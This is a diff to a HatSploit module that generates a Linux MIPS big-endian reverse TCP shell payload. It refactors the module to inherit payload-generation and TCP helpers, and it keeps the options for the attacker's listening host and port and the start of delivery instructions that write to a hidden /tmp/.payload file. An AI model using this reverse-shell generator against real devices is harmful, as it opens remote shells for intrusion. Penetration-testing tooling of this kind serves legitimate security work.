@@ -25,14 +25,10 @@
 #
 
 from core.lib.payload import HatSploitPayload
+from utils.payload.payload import PayloadGenerator
+from utils.tcp.tcp import TCPClient
 
-from utils.tcp.tcp import tcp
-from utils.payload.payload_generator import payload_generator
-
-class HatSploitPayload(HatSploitPayload):
-    tcp = tcp()
-    payload_generator = payload_generator()
-
+class HatSploitPayload(HatSploitPayload, PayloadGenerator, TCPClient):
     details = {
         'Name': "Linux mipsbe Shell Reverse TCP",
         'Payload': "linux/mipsbe/shell_reverse_tcp",
@@ -54,7 +50,7 @@ class HatSploitPayload(HatSploitPayload):
     options = {
         'LHOST': {
             'Description': "Local host.",
-            'Value': tcp.get_local_host(),
+            'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
@@ -75,10 +71,10 @@ class HatSploitPayload(HatSploitPayload):
     def run(self):
         local_host, local_port, executable_format = self.parser.parse_options(self.options)
 
-        local_host = self.payload_generator.host_to_bytes(local_host)
-        local_port = self.payload_generator.port_to_bytes(local_port)
+        local_host = self.host_to_bytes(local_host)
+        local_port = self.port_to_bytes(local_port)
 
-        if not executable_format in self.payload_generator.formats.keys():
+        if not executable_format in self.formats.keys():
             self.badges.output_error("Invalid executable format!")
             return
 
@@ -136,7 +132,7 @@ class HatSploitPayload(HatSploitPayload):
         )
 
         self.badges.output_process("Generating payload...")
-        payload = self.payload_generator.generate(executable_format, 'mipsbe', shellcode)
+        payload = self.generate(executable_format, 'mipsbe', shellcode)
 
         instructions = ""
         instructions += "cat >/tmp/.payload;"
